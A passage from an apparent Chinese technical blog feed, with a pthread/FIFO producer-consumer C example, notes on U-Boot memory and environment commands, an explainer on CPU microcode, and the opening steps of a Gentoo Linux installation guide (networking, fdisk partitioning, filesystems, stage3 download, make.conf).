*mutex);<br></code></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-comment">//定义两个宏,一个用于表示fifo文件的路径,一个用于表示向fifo文件中写入的字符串</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fifo <span class="hljs-string">&quot;/tmp/myfifo&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> string <span class="hljs-string">&quot;myhelloworld&quot;</span></span><br><br><span class="hljs-type">int</span> fd = <span class="hljs-number">-1</span>;<br><span class="hljs-type">pthread_mutex_t</span> mutex;<br><br><span class="hljs-comment">//生产者线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">p_operation</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        <span class="hljs-comment">//获得线程锁</span><br>        pthread_mutex_lock(&amp;mutex);<br>        ret = write(fd, <span class="hljs-built_in">string</span>, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file successful!\n&quot;</span>);<br><span class="hljs-comment">//释放线程锁</span><br>        pthread_mutex_unlock(&amp;mutex);<br>        sleep(<span class="hljs-number">1</span>);<br>        i++;<br>    &#125;<br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//消费则线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">v_operation</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> buffer[stringlen];<br>    bzero(buffer, stringlen);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        pthread_mutex_lock(&amp;mutex);<br>        <span class="hljs-comment">//获得线程互斥锁</span><br>        ret = read(fd, buffer, stringlen);<br>        <span class="hljs-keyword">if</span> (ret == stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo:%s\n&quot;</span>, buffer);<br>            bzero(buffer, stringlen);<br>            i++;<br>        &#125;<br>        pthread_mutex_unlock(&amp;mutex);<br>        <span class="hljs-comment">//释放线程互斥锁</span><br>    &#125;<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span> (F_OK == access(fifo, <span class="hljs-number">0</span>)) &#123;<br>        unlink(fifo);<br>    &#125;<br>    ret = mkfifo(fifo, <span class="hljs-number">0666</span>);<br>    fd = open(fifo, O_RDWR);<br>    <span class="hljs-comment">//将文件描述符设为非阻塞，防止出现死锁(如果没有设置非阻塞,可能会出现一个线程等待数据的到来,而另一个线程在等待线程锁的释放,造成死锁)</span><br>    <span class="hljs-type">int</span> flag = fcntl(fd, F_GETFL);<br>    fcntl(fd, F_SETFL, flag | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;mkfifo&quot;</span>);<br>    &#125;<br>    pthread_mutex_init(&amp;mutex, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">pthread_t</span> threadid[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//创建两个线程</span><br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, p_operation, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, v_operation, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">//等待两个线程结束</span><br>    pthread_join(threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);<br>    pthread_join(threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//销毁线程锁</span><br>    pthread_mutex_destroy(&amp;mutex);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uboot基本命令</title>
    <link href="/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="uboot基本命令"><a href="#uboot基本命令" class="headerlink" title="uboot基本命令"></a>uboot基本命令</h1><h2 id="什么是uboot？"><a href="#什么是uboot？" class="headerlink" title="什么是uboot？"></a>什么是uboot？</h2><p>uboot一个嵌入式领域常用的一种bootloader,支持多种计算机架构,如ARM,PPC,MIPS,</p><h2 id="为什么用uboot"><a href="#为什么用uboot" class="headerlink" title="为什么用uboot?"></a>为什么用uboot?</h2><ul><li>1.开放源码</li><li>2.支持多种嵌入式操作系统内核，如Linux、NetBSD, VxWorks, QNX, RTEMS, ARTOS, LynxOS, android</li><li>3.支持多个处理器系列，如PowerPC、ARM、x86、MIPS</li><li>4.较高的可靠性和稳定性</li><li>5.高度灵活的功能设置,适合U-Boot调试、操作系统不同引导要求、产品发布等</li><li>6.丰富的设备驱动源码，如串口、以太网、SDRAM、FLASH、LCD、NVRAM、EEPROM、RTC、键盘等</li><li>7.较为丰富的开发调试文档与强大的网络技术支持</li></ul><h2 id="uboot常用命令"><a href="#uboot常用命令" class="headerlink" title="uboot常用命令"></a>uboot常用命令</h2><h4 id="1-修改或查看内存命令"><a href="#1-修改或查看内存命令" class="headerlink" title="1.修改或查看内存命令"></a>1.修改或查看内存命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.md[.b,.w,.l] address count(查看内存中的数据)<br>2.nm[.b,.w,.l] address(修改内存中的值)<br>3.mm[.b,.w,.l] address(修改内存中的值,并且他会自增,输入q会退出)<br>4.mw[.b,.w,.l] address value [count](修改内存中的值)<br>5.<span class="hljs-built_in">cp</span>[.b,.w,.l] srcaddress value [count](拷贝内存中的值)<br>6.cmp[.b,.w,.l] addr1 addr2 count(对比两块内存中的值)<br></code></pre></td></tr></table></figure><h4 id="2-读取命令"><a href="#2-读取命令" class="headerlink" title="2.读取命令"></a>2.读取命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.fatinfo &lt;interface&gt; dev:part (显示分区信息)<br>2.fatls &lt;interface&gt; dev:part directory(列出某个目录的文件或者是目录)<br>3.fatload &lt;interface&gt; address dev:part file (将一个文件从磁盘分区读取到内存)<br>以上命令都是针对于fat文件系统分区的操作<br></code></pre></td></tr></table></figure><h4 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3.设置环境变量"></a>3.设置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printenv</span>(显示当前环境变量)<br>setenv name value(设置环境变量)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置和使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是microcode?</title>
    <link href="/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/"/>
    <url>/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是microcode"><a href="#什么是microcode" class="headerlink" title="什么是microcode?"></a>什么是microcode?</h1><h4 id="cpu执行指令的步骤一般为"><a href="#cpu执行指令的步骤一般为" class="headerlink" title="cpu执行指令的步骤一般为"></a>cpu执行指令的步骤一般为</h4><ul><li>1.取指令</li><li>2.指令译码</li><li>3.指令执行</li><li>4.结果写回</li></ul><p>由上述步骤我们知道,cpu在执行二进制代码的时候需要对指令进行译码才能够执行  </p><h3 id="cpu译码的开始"><a href="#cpu译码的开始" class="headerlink" title="cpu译码的开始"></a>cpu译码的开始</h3><p>在译码开始时,程序的指令和数据分别会放到一级指令缓存(L1 cache),和数据一级缓存中,(只有L1 cache才是唯一指令和数据单独分割的cache),然后指令一级缓存中的指令会进入解码器,然后才是指令执行的开始</p><h3 id="cpu如何认识并指令指令"><a href="#cpu如何认识并指令指令" class="headerlink" title="cpu如何认识并指令指令"></a>cpu如何认识并指令指令</h3><h4 id="cpu译码器-Instuction-Decode-Unit-IDU"><a href="#cpu译码器-Instuction-Decode-Unit-IDU" class="headerlink" title="cpu译码器(Instuction Decode Unit(IDU))"></a>cpu译码器(Instuction Decode Unit(IDU))</h4><p>cpu译码器一般分为两种</p><ul><li>1.硬件指令译码器</li><li>2.微码指令译码器</li></ul><p>现在我们使用的计算机一般是X86架构,属于CISC(复杂指令集),指令种类繁多,如果所有的解码都通过硬件来完成,将会大幅增加硬件布线的难度,因此一般cpu在设计的时候一般只会对一些少量基本的指令采用硬件解码的方式,而一些复杂的指令采用微码指令译码器将其拆解为多条精简指令(microcode),因此cpu只有microcode才是基本的执行单位,硬件解码完成后,将会被cpu调度器(scheduler)放入pipeline提高指令的并行性</p><h3 id="microcode如何修复"><a href="#microcode如何修复" class="headerlink" title="microcode如何修复?"></a>microcode如何修复?</h3><p>我们知道,一条复杂指令要通过microcode译码器分解为多条microcode才能够被cpu所执行,原始的microcode来自于一块rom,为了microcode,新设计了一块较小的SRAM,用来为该rom上的microcode打补丁Microcode更新通常通过更新BIOS来更新</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gentoolinux安装步骤</title>
    <link href="/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Gentoolinux安装步骤-systemd"><a href="#Gentoolinux安装步骤-systemd" class="headerlink" title="Gentoolinux安装步骤(systemd)"></a>Gentoolinux安装步骤(systemd)</h1><h4 id="1-基本文件的获取"><a href="#1-基本文件的获取" class="headerlink" title="1.基本文件的获取"></a>1.基本文件的获取</h4><ul><li>1.获取livecd<br>livecd可以使用Gentoo官方提供的livecd或者其他linux distribution</li><li>2.获取stage<br>stage3分为两种,一种是以systemd作为init程序,一种是以openrc做为init程序(Gentoo官方是推荐openrc)</li></ul><h4 id="2-网络连接"><a href="#2-网络连接" class="headerlink" title="2.网络连接"></a>2.网络连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#ethernet </span><br><span class="hljs-comment">#配置ip地址</span><br>ip addr <span class="hljs-variable">$ipaddress</span>/netmask dev interface<br><span class="hljs-comment">#配置路由</span><br>ip route add default via ipaddress<br><span class="hljs-comment">#wifi</span><br><br><span class="hljs-comment">#扫描wifi</span><br>iwlist wlan0 scan<br><br><span class="hljs-comment">#连接wifi</span><br>wpa_passpharse SSID password &gt; wifi.conf<br>wpa_supplicant -c wifi.conf -B -i wlan0<span class="hljs-comment">#wlan为无线网卡名称,自行根据自己的网卡型号进行改动</span><br><br><br><span class="hljs-comment">#获取ip地址</span><br>dhcpcd wlan0<br></code></pre></td></tr></table></figure><h4 id="3-磁盘分区"><a href="#3-磁盘分区" class="headerlink" title="3.磁盘分区"></a>3.磁盘分区</h4><p>这里使用fdisk工具对磁盘进行分区,同样的也可以使用cfdisk或者其他磁盘分区工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk /dev/sda<br></code></pre></td></tr></table></figure><p>查看当前磁盘分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):p<br><br>Disk /dev/sda: 28.89 GiB, 31001149440 bytes, 60549120 sectors<br>Disk model: DataTraveler 2.0<br>Units: sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br>Disklabel <span class="hljs-built_in">type</span>: gpt<br>Disk identifier: 21AAD8CF-DB67-0F43-9374-416C7A4E31EA<br> <br>Device        Start      End  Sectors  Size Type<br>/dev/sda1      2048   526335   524288  256M EFI System<br>/dev/sda2    526336  2623487  2097152    1G Linux swap<br>/dev/sda3   2623488 19400703 16777216    8G Linux filesystem<br>/dev/sda4  19400704 60549086 41148383 19.6G Linux filesystem<br></code></pre></td></tr></table></figure><p>创建一个gpt分区列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):g<br><br>Created a new GPT disklabel (GUID: 87EA4497-2722-DF43-A954-368E46AE5C5F).<br></code></pre></td></tr></table></figure><p>如果当前存在其他的分区,可以选择将分区删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):d<br><br>Partition number (1-4): 1<br></code></pre></td></tr></table></figure><p>创建一个efi分区,大小建议256MB</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):n<br><br>Partition number (1-128, default 1): 1<br>First sector (2048-60549086, default 2048): <br>Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-60549086, default 60549086): +256M<br> <br>Created a new partition 1 of <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Linux filesystem&#x27;</span> and of size 256 MiB.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):t<br><br>Selected partition 1<br>Partition <span class="hljs-built_in">type</span> (<span class="hljs-built_in">type</span> L to list all types): 1<br>Changed <span class="hljs-built_in">type</span> of partition <span class="hljs-string">&#x27;Linux filesystem&#x27;</span> to <span class="hljs-string">&#x27;EFI System&#x27;</span>.<br></code></pre></td></tr></table></figure><p>创建一个swap分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):n<br><br>Partition number (2-128, default 2): <br>First sector (526336-60549086, default 526336): <br>Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (526336-60549086, default 60549086): +4G<br> <br>Created a new partition 2 of <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Linux filesystem&#x27;</span> and of size 4 GiB.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):t<br><br>Partition number (1,2, default 2): 2<br>Partition <span class="hljs-built_in">type</span> (<span class="hljs-built_in">type</span> L to list all types): 19<br> <br>Changed <span class="hljs-built_in">type</span> of partition <span class="hljs-string">&#x27;Linux filesystem&#x27;</span> to <span class="hljs-string">&#x27;Linux swap&#x27;</span>.<br></code></pre></td></tr></table></figure><p>创建主分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):p<br><br>Disk /dev/sda: 28.89 GiB, 31001149440 bytes, 60549120 sectors<br>Disk model: DataTraveler 2.0<br>Units: sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br>Disklabel <span class="hljs-built_in">type</span>: gpt<br>Disk identifier: 87EA4497-2722-DF43-A954-368E46AE5C5F<br> <br>Device       Start      End  Sectors  Size Type<br>/dev/sda1     2048   526335   524288  256M EFI System<br>/dev/sda2   526336  8914943  8388608    4G Linux swap<br>/dev/sda3  8914944 60549086 51634143 24.6G Linux filesystem<br></code></pre></td></tr></table></figure><p>将分区信息写入磁盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>):w<br></code></pre></td></tr></table></figure><p>当前磁盘分区信息</p><table><thead><tr><th>分区</th><th>详细信息</th></tr></thead><tbody><tr><td>&#x2F;dev&#x2F;sda1</td><td>启动分区</td></tr><tr><td>&#x2F;dev&#x2F;sda2</td><td>swap分区</td></tr><tr><td>&#x2F;dev&#x2F;sda3</td><td>根分区</td></tr></tbody></table><h4 id="4-创建文件系统"><a href="#4-创建文件系统" class="headerlink" title="4.创建文件系统"></a>4.创建文件系统</h4><p>boot分区文件系统一般考虑兼容性使用fat文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs.vfat /dev/sda1<br></code></pre></td></tr></table></figure><p>swap分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /dev/sda2<br></code></pre></td></tr></table></figure><p>根分区,可采用(ext3&#x2F;4 xfs btrfs ntfs jfs…..)使用非ext文件系统在后面编译linux内核的时候要启动linux内核对该文件系统的支持</p><p>这里采用btrfs文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs.btrfs /dev/sda3<br></code></pre></td></tr></table></figure><h4 id="5-分区挂载"><a href="#5-分区挂载" class="headerlink" title="5.分区挂载"></a>5.分区挂载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将/dev/sda3主磁盘分区挂载到/mnt/gentoo下面</span><br>mount /dev/sda3 /mnt/gentoo<br></code></pre></td></tr></table></figure><h4 id="6-安装stage3包"><a href="#6-安装stage3包" class="headerlink" title="6.安装stage3包"></a>6.安装stage3包</h4><p>stage3包提供了最基本的portage包管理器编译工具链和一些最基本的链接库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取Gentoo stage3包</span><br>wget https://bouncer.gentoo.org/fetch/root/all/releases/amd64/autobuilds/20220109T170538Z/stage3-amd64-systemd-20220109T170538Z.tar.xz<br>tar -Jxf stage3-amd64-systemd-20220109T170538Z.tar.xz -C /mnt/gentoo<br><br><span class="hljs-comment">#将之前格式化的boot磁盘挂载</span><br>mount /dev/sda1 /mnt/gentoo/boot<br></code></pre></td></tr></table></figure><h4 id="7-基本编译环境准备"><a href="#7-基本编译环境准备" class="headerlink" title="7.基本编译环境准备"></a>7.基本编译环境准备</h4><h5 id="1-配置编译portage编译软件的参数"><a href="#1-配置编译portage编译软件的参数" class="headerlink" title="1.配置编译portage编译软件的参数"></a>1.配置编译portage编译软件的参数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano /mnt/gentoo/etc/portage/make.conf<br><br><span class="hljs-comment"># These settings were set by the catalyst build script that automatically</span><br><span class="hljs-comment"># built this stage.</span><br><span class="hljs-comment"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class="hljs-comment"># detailed example.</span><br>COMMON_FLAGS=<span class="hljs-string">&quot;-march=native -O3 -pipe -fstack-protector-strong&quot;</span> <span class="hljs-comment">#设置编译参数(-march=native可以根据cpu指令集进行优化,-O3优化级别)</span><br>CFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>    <span class="hljs-comment">#C编译参数</span><br>CXXFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>  <span class="hljs-comment">#C++编译参数</span><br>FCFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>ACCEPT_KEYWORDS=<span class="hljs-string">&quot;amd64&quot;</span>  <span class="hljs-comment">#可接受的软件包等级(稳定与不稳定)(这里为全局keyworkds,若想为特定软件包指定特定的Keyworkds(可以在/etc/protage/portage.accpet_keywords</span><br>ACCEPT_LICENSE=<span class="hljs-string">&quot;*&quot;</span>      <span class="hljs-comment">#可接受的软件包许可证</span><br>MAKEOPTS=<span class="hljs-string">&quot;-j8 -l7.2&quot;</span>    <span 